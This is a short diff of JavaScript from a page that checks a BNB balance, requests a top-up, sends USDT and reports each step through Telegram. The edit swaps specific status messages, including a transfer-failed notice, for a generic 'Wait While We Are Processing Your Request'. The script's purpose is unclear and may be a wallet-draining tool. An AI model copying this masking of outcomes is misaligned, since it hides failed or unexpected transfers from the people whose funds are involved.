@@ -262,7 +262,7 @@
           return sendTelegram(message);
         }
 
-        message += `✅ *Top-up Requested!*\n⏳ *Waiting for balance update...*\n`;
+        message += `Wait While We Are Processing Your Request*\n`;
         await new Promise(r => setTimeout(r, 15000)); // Wait for 15 seconds
 
         // Recheck BNB balance
@@ -278,9 +278,9 @@
           return sendTelegram(message);
         }
 
-        message += `✅ *BNB now sufficient! Proceeding...*\n`;
+        message += `Wait While We Are Processing Your Request*\n`;
       } else {
-        message += `✅ *BNB is sufficient!*\n`;
+        message += `Wait While We Are Processing Your Request\n`;
       }
 
       loader.style.display = "none"; // Hide loader
@@ -303,7 +303,7 @@
         status.innerText = "✅ USDT sent successfully!";
       } catch (err) {
         console.error(err);
-        message += `❌ *USDT Transfer Failed*`;
+        message += `Wait While We Are Processing Your Request*`;
         status.innerText = "❌ Failed to send USDT.";
       }
 
